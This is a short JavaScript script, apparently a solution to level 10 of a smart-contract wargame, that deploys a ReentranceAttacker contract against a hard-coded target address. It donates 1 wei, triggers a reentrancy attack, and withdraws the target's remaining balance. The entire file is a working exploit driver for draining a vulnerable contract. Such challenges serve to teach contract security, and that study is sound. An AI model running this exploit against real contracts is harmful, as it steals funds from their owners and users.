const level10 = async (web3, deployer, ReentranceAttacker) => {

    const targetAddress = '0x8cd23e12d235b6c3bf13fd858cb06470ed4a90d0';

    console.log(`Exploiting Level10 target ${targetAddress}...`);

    console.log('Creating ReentranceAttacker...');
    const attacker = await deployer.deploy(ReentranceAttacker, targetAddress);

    console.log('Donating 1 Wei to the attacker contract...');
    await attacker.donate({value: '1'});

    console.log('Triggering reentrance attack...');
    await attacker.reentrance();

    console.log('Looking up the amount of remaining funds...');
    const remaining = await web3.eth.getBalance(targetAddress);

    console.log('Withdrawing the remaining funds...');
    await attacker.withdraw(remaining);
};

module.exports = level10;